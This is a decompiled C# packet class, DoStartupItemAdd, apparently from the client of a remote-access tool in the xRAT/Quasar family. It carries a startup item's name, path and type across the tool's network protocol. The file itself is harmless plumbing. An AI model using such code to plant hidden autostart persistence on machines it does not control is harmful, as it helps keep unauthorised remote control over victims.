using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x0200008E RID: 142
	[Serializable]
	public class DoStartupItemAdd : IPacket
	{
		// Token: 0x1700008B RID: 139
		// (get) Token: 0x060003AA RID: 938 RVA: 0x00003D0C File Offset: 0x00001F0C
		// (set) Token: 0x060003AB RID: 939 RVA: 0x00003D14 File Offset: 0x00001F14
		public string Name { get; set; }

		// Token: 0x1700008C RID: 140
		// (get) Token: 0x060003AC RID: 940 RVA: 0x00003D1D File Offset: 0x00001F1D
		// (set) Token: 0x060003AD RID: 941 RVA: 0x00003D25 File Offset: 0x00001F25
		public string Path { get; set; }

		// Token: 0x1700008D RID: 141
		// (get) Token: 0x060003AE RID: 942 RVA: 0x00003D2E File Offset: 0x00001F2E
		// (set) Token: 0x060003AF RID: 943 RVA: 0x00003D36 File Offset: 0x00001F36
		public int Type { get; set; }

		// Token: 0x060003B0 RID: 944 RVA: 0x000021D4 File Offset: 0x000003D4
		public DoStartupItemAdd()
		{
		}

		// Token: 0x060003B1 RID: 945 RVA: 0x00003D3F File Offset: 0x00001F3F
		public DoStartupItemAdd(string name, string path, int type)
		{
			this.Name = name;
			this.Path = path;
			this.Type = type;
		}

		// Token: 0x060003B2 RID: 946 RVA: 0x00003D5C File Offset: 0x00001F5C
		public void Execute(Client client)
		{
			client.Send<DoStartupItemAdd>(this);
		}
	}
}
